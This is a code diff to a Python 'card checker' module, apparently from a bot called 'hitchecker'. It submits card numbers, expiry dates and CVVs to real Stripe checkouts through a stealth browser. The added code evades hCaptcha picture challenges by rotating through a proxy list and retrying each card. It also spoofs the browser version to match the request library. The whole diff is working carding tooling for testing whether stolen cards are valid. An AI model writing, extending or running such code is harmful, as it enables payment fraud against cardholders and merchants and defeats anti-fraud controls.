@@ -31,6 +31,10 @@ logger = logging.getLogger("stripe_native")
 # seconds, the bank is given the rest.
 THE_TIME_TO_WAIT = 70
 
+# How many addresses a card is tried on when the captcha asks for
+# pictures.
+THE_TRIES = 3
+
 # The things that are put into the page.
 THE_COUNTRY = "US"
 THE_CITIES = [
@@ -268,7 +272,21 @@ def _clear_the_lock():
 _THE_BROWSER = {"ctx": None, "pw": None, "proxy": None}
 
 
-async def _the_browser(launch, page_options, stealth):
+def _the_browser():
+    """The browser of the version the request library pretends to be.
+
+    The browser that answers the captcha has to be the same version as
+    the request that carries the answer, so the browser of that exact
+    version is used when it is on the machine.
+    """
+    try:
+        from local_hcaptcha_solver import _the_browser as _which
+        return _which()
+    except Exception:
+        return {"channel": "chrome"}
+
+
+async def _the_browser_open(launch, page_options, stealth):
     """The browser of the checkout, opened once and kept."""
     from playwright.async_api import async_playwright
 
@@ -290,7 +308,7 @@ async def _the_browser(launch, page_options, stealth):
     pw = await async_playwright().start()
     try:
         ctx = await pw.chromium.launch_persistent_context(
-            _the_profile(), channel="chrome", bypass_csp=True,
+            _the_profile(), **_the_browser(), bypass_csp=True,
             **page_options, **launch)
     except Exception:
         _clear_the_lock()
@@ -553,6 +571,48 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
     card, what stripe said, what is known about the card, and how long
     it took.
     """
+    # The captcha asks for pictures when it does not like the address
+    # the card comes from.  So when the card is asked for pictures, it
+    # is tried again on another address, and the addresses are not the
+    # same one twice running.
+    for attempt in range(THE_TRIES):
+        status, msg, info, took = await _one_card(cc, mm, yy, cvv, checkout_url,
+                                                  proxy, timeout)
+        if status != "error" or "pictures" not in str(msg).lower():
+            return status, msg, info, took
+        logger.info("the captcha wants pictures on this address, "
+                    "another one is tried")
+        proxy = _another_address(proxy)
+        if not proxy:
+            return status, msg, info, took
+    return status, msg, info, took
+
+
+def _another_address(used):
+    """An address that is not the one just used."""
+    try:
+        with open("/root/hitchecker/bot/proxy.txt", encoding="utf-8",
+                  errors="replace") as f:
+            lines = [l.strip() for l in f if l.strip()]
+        if not lines:
+            return None
+        random.shuffle(lines)
+        for line in lines:
+            if used and line in used:
+                continue
+            parts = line.split(":")
+            if len(parts) == 4:
+                host, port, user, pwd = parts
+                return "http://%s:%s@%s:%s" % (user, pwd, host, port)
+            if len(parts) == 2:
+                return "http://%s:%s" % (parts[0], parts[1])
+    except Exception:
+        pass
+    return None
+
+
+async def _one_card(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
+    """One card, in the real checkout, in a real browser."""
     started = time.time()
     seen = []
     try:
@@ -719,12 +779,8 @@ async def native_check(cc, mm, yy, cvv, checkout_url, proxy=None, timeout=None):
                     if await _image_challenge_up(page):
                         logger.info("the captcha wants pictures, "
                                     "which cannot be answered here")
-                        intent = {"intent_id": "", "client_secret": "",
-                                  "read": {"status": "requires_payment_method",
-                                           "last_payment_error": {
-                                               "code": "captcha_picture_challenge",
-                                               "message": "hCaptcha picture challenge"}}}
-                        break
+                        return ("error", "the captcha wants pictures",
+                                "", time.time() - started)
                 except Exception:
                     pass
 
